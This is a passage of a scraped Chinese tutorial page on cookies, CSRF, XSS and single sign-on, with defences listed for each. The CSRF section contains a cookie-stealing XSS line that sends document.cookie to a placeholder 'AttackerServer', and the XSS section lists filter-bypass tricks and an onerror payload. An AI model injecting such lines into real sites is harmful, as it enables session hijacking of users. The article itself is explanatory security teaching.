。当服务器返回给客户端一个http响应信息时，其中如果包含\x3ccode\x3eSet-Cookie\x3c\/code\x3e这个头部时，意思就是指示客户端建立一个\x3ccode\x3ecookie\x3c\/code\x3e，并且在后续的http请求中自动发送这个\x3ccode\x3ecookie\x3c\/code\x3e到服务器端，直到这个\x3ccode\x3ecookie\x3c\/code\x3e过期。如果\x3ccode\x3ecookie\x3c\/code\x3e的生存时间是整个会话期间的话，那么浏览器会将\x3ccode\x3ecookie\x3c\/code\x3e保存在内存中，浏览器关闭时就会自动清除这个\x3ccode\x3ecookie\x3c\/code\x3e。另外一种情况就是保存在客户端的硬盘中，浏览器关闭的话，该\x3ccode\x3ecookie\x3c\/code\x3e也不会被清除，下次打开浏览器访问对应网站时，这个\x3ccode\x3ecookie\x3c\/code\x3e就会自动再次发送到服务器端。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader21\x22\x3e\n\x3ccode\x3ecookie\x3c\/code\x3e服务器端写入\x3c\/h2\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\/\/java的写法\nresponse.setHeader(\x26quot;SET-COOKIE\x26quot;, key \x2b \x26quot;=\x26quot;\x2b value \x2b \x26quot;;Path=\/;domain=\x26quot;\x2b domain \x2b \x26quot;;date=\x26quot;\x2bdate);\n\n\/\/php 中的写法\nsetcookie(name,value,expire,path,domain,secure)\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs q\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-comment\x22\x3e\/\/java的写法\x3c\/span\x3e\nresponse.setHeader(\x3cspan class=\x22hljs-string\x22\x3e\x22SET-COOKIE\x22\x3c\/span\x3e, \x3cspan class=\x22hljs-built_in\x22\x3ekey\x3c\/span\x3e \x2b \x3cspan class=\x22hljs-string\x22\x3e\x22=\x22\x3c\/span\x3e\x2b \x3cspan class=\x22hljs-built_in\x22\x3evalue\x3c\/span\x3e \x2b \x3cspan class=\x22hljs-string\x22\x3e\x22;Path=\/;domain=\x22\x3c\/span\x3e\x2b domain \x2b \x3cspan class=\x22hljs-string\x22\x3e\x22;date=\x22\x3c\/span\x3e\x2bdate);\n\n\x3cspan class=\x22hljs-comment\x22\x3e\/\/php 中的写法\x3c\/span\x3e\nsetcookie(name,\x3cspan class=\x22hljs-built_in\x22\x3evalue\x3c\/span\x3e,expire,path,domain,secure)\x3c\/code\x3e\x3c\/pre\x3e\n\x3ch2 id=\x22articleHeader22\x22\x3ereference\x3c\/h2\x3e\n\x3cp\x3e\x3ca href=\x22https:\/\/my.oschina.net\/ososchina\/blog\/339918\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttps:\/\/my.oschina.net\/ososch...\x3c\/a\x3e\x3c\/p\x3e\n\x3cp\x3e\x3ca href=\x22https:\/\/blog.csdn.net\/dong123dddd\/article\/details\/50388656\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttps:\/\/blog.csdn.net\/dong123...\x3c\/a\x3e\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader23\x22\x3ecsrf（跨站请求伪造）\x3c\/h1\x3e\n\x3ch2 id=\x22articleHeader24\x22\x3e过程\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e用户c打开浏览器，登录网站a\x3c\/li\x3e\n\x3cli\x3e登录成功后，记录登录信息\x3ccode\x3ecookie\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3e在网站\x3ccode\x3ea\x3c\/code\x3e未退出的情况下，打开网站\x3ccode\x3eb\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3e网站\x3ccode\x3eb\x3c\/code\x3e在收到用户请求后返回攻击性代码，获取网站\x3ccode\x3ea\x3c\/code\x3e的\x3ccode\x3ecookie\x3c\/code\x3e，并发出请求a网站（注意:这儿是两步）\x3c\/li\x3e\n\x3cli\x3e网站\x3ccode\x3ea\x3c\/code\x3e误以为还是用户c发出的请求\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader25\x22\x3e窃取cookie\x3c\/h2\x3e\n\x3cp\x3e向被攻击者的服务器页面上注入一段\x3ccode\x3ejavascript\x3c\/code\x3e代码(借助xss跨站脚本攻击)\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22document.location=\x27http:\/\/AttackerServer\/getCookie.php?cookie=\x27\x2bdocument.cookie;\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs coffeescript\x22\x3e\x3ccode style=\x22word-break: break-word; white-space: initial;\x22\x3e\x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.location=\x3cspan class=\x22hljs-string\x22\x3e\x27http:\/\/AttackerServer\/getCookie.php?cookie=\x27\x3c\/span\x3e\x2b\x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.cookie;\x3c\/code\x3e\x3c\/pre\x3e\n\x3ch2 id=\x22articleHeader26\x22\x3e防御\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e验证\x3ccode\x3ehttp referer\x3c\/code\x3e字段\x3c\/li\x3e\n\x3cli\x3e在请求地址中添加token\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3cp\x3e系统开发者可以在\x3ccode\x3eHTTP\x3c\/code\x3e请求中以参数的形式加入一个随机产生的\x3ccode\x3etoken\x3c\/code\x3e，并在服务器端建立一个拦截器来验证这个\x3ccode\x3etoken\x3c\/code\x3e，如果请求中没有\x3ccode\x3etoken\x3c\/code\x3e或者\x3ccode\x3etoken\x3c\/code\x3e内容不正确，则认为可能是\x3ccode\x3eCSRF\x3c\/code\x3e攻击而拒绝该请求。\x3c\/p\x3e\n\x3col\x3e\x3cli\x3e在\x3ccode\x3eHTTP\x3c\/code\x3e头中自定义属性并验证（不会被泄露）\x3c\/li\x3e\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader27\x22\x3e\x3ccode\x3ereference\x3c\/code\x3e\x3c\/h2\x3e\n\x3cp\x3e\x3ca href=\x22http:\/\/www.freebuf.com\/articles\/web\/11840.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/www.freebuf.com\/articl...\x3c\/a\x3e\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader28\x22\x3exss（跨站脚本攻击）\x3c\/h1\x3e\n\x3ch2 id=\x22articleHeader29\x22\x3e分类\x3c\/h2\x3e\n\x3col\x3e\x3cli\x3e反射型（非持久型）\x3c\/li\x3e\x3c\/ol\x3e\n\x3cp\x3e那些浏览器每次都要在参数中提交恶意数据才能触发的跨站脚本漏洞。\x3c\/p\x3e\n\x3cp\x3e可以让一个域名转向到恶意\x3ccode\x3eURL\x3c\/code\x3e，把那个域名发给用户\x3c\/p\x3e\n\x3col\x3e\x3cli\x3e存储型（持久型）\x3c\/li\x3e\x3c\/ol\x3e\n\x3cp\x3e指通过提交恶意数据到存储器（比如数据库、文本文件等），\x3ccode\x3eWeb\x3c\/code\x3e应用程序输出的时候是从存储器中读出恶意数据输出到页面的一类跨站脚本漏洞。\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader30\x22\x3e常见攻击方法\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e绕过\x3ccode\x3exss-filter\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3e利用\x3ccode\x3eimg\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3e空格，回车，\x3ccode\x3etab\x3c\/code\x3e来绕过过滤\x3c\/li\x3e\n\x3cli\x3e利用事件如：\x3ccode\x3e\x26lt;img src=“#” onerror= “alert(1)”\/\x26gt;\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3ecss跨站：\x3ccode\x3ebackground-url\x3c\/code\x3e\n\x3c\/li\x3e\n\x3cli\x3e利用字符编码\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader31\x22\x3e防御\x3c\/h2\x3e\n\x3col\x3e\x3cli\x3e\n\x3ccode\x3exss-filter\x3c\/code\x3e，过滤标签\x3c\/li\x3e\x3c\/ol\x3e\n\x3cp\x3e2.\x3ccode\x3e httpOnly\x3c\/code\x3e\x3c\/p\x3e\n\x3col\x3e\x3cli\x3e将变量输出到页面时，要编码\x3c\/li\x3e\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader32\x22\x3ereference\x3c\/h2\x3e\n\x3cp\x3e\x3ca href=\x22http:\/\/www.cnblogs.com\/wqhwe\/p\/5416976.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/www.cnblogs.com\/wqhwe\/...\x3c\/a\x3e\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader33\x22\x3e单系统登录\x3c\/h1\x3e\n\x3ch2 id=\x22articleHeader34\x22\x3e\n\x3ccode\x3ehttp\x3c\/code\x3e无状态协议\x3c\/h2\x3e\n\x3cp\x3e浏览器每次请求，服务器都单独处理\x3c\/p\x3e\n\x3cp\x3e要鉴别浏览器请求，又因为http是无状态协议，所以需要服务器和浏览器共同维护一个状态\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader35\x22\x3e会话机制\x3c\/h2\x3e\n\x3cp\x3e浏览器第一次请求服务器，创建一个会话id，并由浏览器存储，以后每次请求都带上，服务器取得后可判断是否是同一个用户\x3c\/p\x3e\n\x3cp\x3e单系统利用\x3ccode\x3ecookie\x3c\/code\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader36\x22\x3e登录状态\x3c\/h2\x3e\n\x3cp\x3e浏览器第一次请求服务器，需要验证用户名和密码，通过与数据库里的作比较，验证通过将会话标记为“已授权”\x3c\/p\x3e\n\x3cp\x3e以后每次请求都检查登录状态\x3c\/p\x3e\n\x3ch1 id=\x22articleHeader37\x22\x3e单点登录(多系统登录，\x3ccode\x3esingle sign on\x3c\/code\x3e，\x3ccode\x3esso\x3c\/code\x3e)\x3c\/h1\x3e\n\x3cp\x3e用户登录注销一次，就可以在多个系统中得到效果\x3c\/p\x3e\n\x3cp\x3e由于多系统的域不一样，所有cookie会受到限制，浏览器发送\x3ccode\x3ehttp\x3c\/code\x3e请求时会自动携带与该域匹配的\x3ccode\x3ecookie\x3c\/code\x3e，而不是所有\x3ccode\x3ecookie\x3c\/code\x3e\x3c\/p\x3e\n\x3cp\x3e如果将\x3ccode\x3edomain\x3c\/code\x3e设置为顶级域名会有限制：\x3c\/p\x3e\n\x3col\x3e\n\x3cli\x3e系统群域名得统一\x3c\/li\x3e\n\x3cli\x3e各系统使用的技术要相同\x3c\/li\x3e\n\x3cli\x3e\n\x3ccode\x3ecookie\x3c\/code\x3e不安全\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader38\x22\x3e登录\x3c\/h2\x3e\n\x3cp\x3e相比于单系统登录，\x3ccode\x3esso\x3c\/code\x3e多了一个认证中心，只有认证中心接受用户名和密码等安全信息，其他系统不提供登录入口，只接受认证中心的间接授权。间接授权通过令牌实现，\x3ccode\x3esso\x3c\/code\x3e认证中心验证用户的用户名密码没问题，创建授权令牌，在接下来的跳转过程中，授权令牌作为参数发送给各个子系统，子系统拿到令牌，即得到了授权，可以借此创建局部会话，局部会话登录方式与单系统的登录方式相同。这个过程，也就是单点登录的原理，用下图说明\x3c\/p\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000014969668?w=737\x26amp;h=931\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000014969668?w=737\x26amp;h=931\x22 alt=\x22image\x22 title=\x22image\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3cp\x3e用户登录成功之后，会与sso认证中心及各个子系统建立会话，用户与sso认证中心建立的会话称为全局会话，用户与各个子系统建立的会话称为局部会话，局部会话建立之后，用户访问子系统受保护资源将不再通过sso认证中心\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader39\x22\x3e注销\x3c\/h2\x3e\n\x3cp\x3e\x3cspan class=\x22img-wrap\x22\x3e\x3cimg data-src=\x22\/img\/remote\/1460000014969669?w=698\x26amp;h=499\x22 src=\x22https:\/\/static.alili.tech\/img\/remote\/1460000014969669?w=698\x26amp;h=499\x22 alt=\x22注销\x22 title=\x22注销\x22 style=\x22cursor: pointer;\x22\x3e\x3c\/span\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader40\x22\x3e具体跳转\x3c\/h2\x3e\n\x3cp\x3e假设认证中心和系统2的url分别是：\x3ccode\x3esso.com、system2.com\x3c\/code\x3e ，访问 \x3ccode\x3esystem2.com\x3c\/code\x3e 时因未登录而跳转到 \x3ccode\x3esso.com\x3c\/code\x3e ，跳转地址：\x3ccode\x3ehttp:\/\/sso.com?service=http:\/\/system2.com\x3c\/code\x3e（不需要额外信息），此时，就变成了浏览器与 \x3ccode\x3ehttp:\/\/sso.com\x3c\/code\x3e 站点之间的会话，这个会话因为系统1登录的原因已经被标记为已登录，所以认证中心取一块令牌，根据service参数回跳，并附上令牌，回跳地址：\x3ccode\x3ehttp:\/\/system2.com?token=token\x3c\/code\x3e\x3c\/p\x3e\n\x3ch2 id=\x22articleHeader41\x22\x3e如何验证登录信息\x3c\/h2\x3e\n\x3col\x3e\n\x3cli\x3e\n\x3cp\x3e不同域之间\x3c\/p\x3e\n\x3cul\x3e\n\x3cli\x3e当登录某一系统后，须跳转到其它系统并设置cookie\x3c\/li\x3e\n\x3cli\x3e\x3ca href=\x22https:\/\/blog.csdn.net\/yanyang1116\/article\/details\/54837603\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3enodejs实现302跳转\x3c\/a\x3e\x3c\/li\x3e\n\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e同一域名不同站点\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3e共享\x3ccode\x3ecookie\x3c\/code\x3e\n\x3c\/li\x3e\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3cli\x3e\n\x3cp\x3e同一域，不同子域\x3c\/p\x3e\n\x3cul\x3e\x3cli\x3e存放\x3ccode\x3esessionId\x3c\/code\x3e的域都是上一级的\x3c\/li\x3e\x3c\/ul\x3e\n\x3c\/li\x3e\n\x3c\/ol\x3e\n\x3ch2 id=\x22articleHeader42\x22\x3ereference\x3c\/h2\x3e\n\x3cp\x3e\x3ca href=\x22https:\/\/www.cnblogs.com\/wxj-106\/p\/8097880.html\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttps:\/\/www.cnblogs.com\/wxj-1...\x3c\/a\x3e\x3c\/p\x3e\n\x3cp\x3e\x3ca href=\x22http:\/\/www.cnblogs.com\/ywlaker\/p\/6113927.html#!comments\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/www.cnblogs.com\/ywlake...\x3c\/a\x3e\x3c\/p\x3e\n\n                \n"
            html = html.replace(/"{/g, "{")
            html = html.replace(/{"/g, "{")
            html = html.replace(/"}/g, "}")
            html = html.replace(/}"/g, "}")
            $('#raw').html(html);

            let postTitle =  $('.posttitle').text()
            let postContentTitle =  $('#raw > h1').text()
            if(postTitle === postContentTitle){
                $('#raw > h1').hide()
            }
            $('button.preview').hide()
        })</script></div><h1 id="版权声明">版权声明</h1><p>本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，</p><p>本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。</p><p>原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！</p><h2 id="原文标题">原文标题</h2><p>session与登录机制</p><h2 id="原文链接">原文链接</h2><p><a href="https://segmentfault.com/a/1190000014969663">https://segmentfault.com/a/1190000014969663</a></p><h2>本文链接：</h2><a href="https://alili.tech/archive/60ppqvz27vk/" target="_blank">https://alili.tech/archive/60ppqvz27vk/</a></div></article><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><div class="blog-post-comments"></div><script>new Valine({
        el: '.blog-post-comments', 
        app_id: 'ItyOVb4I33bTwprf3cY6uqMc-gzGzoHsz', 
        app_key: 'hLhtmd4tT0qJbyO2SgQ8odya', 
        placeholder: '说点什么?', 
        avatar:'robohash',
        notify:true,
        verify:true
    });</script><ul id="more-post-list" class="archive readmore"><h3>其他推荐</h3><li><a href="/archive/hvvo3rmt3dj/">JS打包工具rollup——完全入门指南<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/semhn25oasq/">Spring Boot [基于Spring Boot 与 Vue的后台脚手架] SanJi Boot Security<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/t1iml4tjj7r/">WebGL入门demo<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/8gbs1y0r0ns/">[面试专题]一线互联网大厂面试总结<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/4os59l0zeel/">react&#43;react-router4&#43;redux最新版构建分享<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/dznv6a9ewcj/">react虚拟dom机制与diff算法<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/myiqarfowok/">一套Vue的单页模板：N3-admin<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/2eeweuxgjbk/">使用 json-server 搭建 api mock 服务 (一)<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/h7cszygcoqq/">使用Ionic3框架开始第一个混合开发APP<aside class="dates">2019-01-04</aside></a></li><li><a href="/archive/g8by6kv9q8t/">如何只用 CSS 完成漂亮的加载<aside class="dates">2019-01-04</aside></a></li></ul></section></div><footer id="footer"><div class="footer-left">Copyright © 2019 Fan <a href="http://www.miitbeian.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">浙ICP备18045521号</a></div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></nav></div></footer><script src="https://alili.tech/lib/justified-gallery/jquery.justifiedGallery.min.js"></script><script src="https://alili.tech/lib/typed.js"></script><script src="https://alili.tech/js/main.js"></script><script async src=""></script><script>(function(){
  if(location.host!=='alili.tech')return;
  var ga = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  ga.src = 'https://www.googletagmanager.com/gtag/js?id=UA-129382678-1';       
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(ga, s);
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-129382678-1');
})()</script><script>(function(){
    if(location.host!=='alili.tech')return;
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
          navigator.serviceWorker
              .register('/sw.js')
              .then(registration => {
                  console.log('SW registered: ', registration);
              })
              .catch(registrationError => {
                  console.log('SW registration failed: ', registrationError);
              });
      });
  }</script></body></html>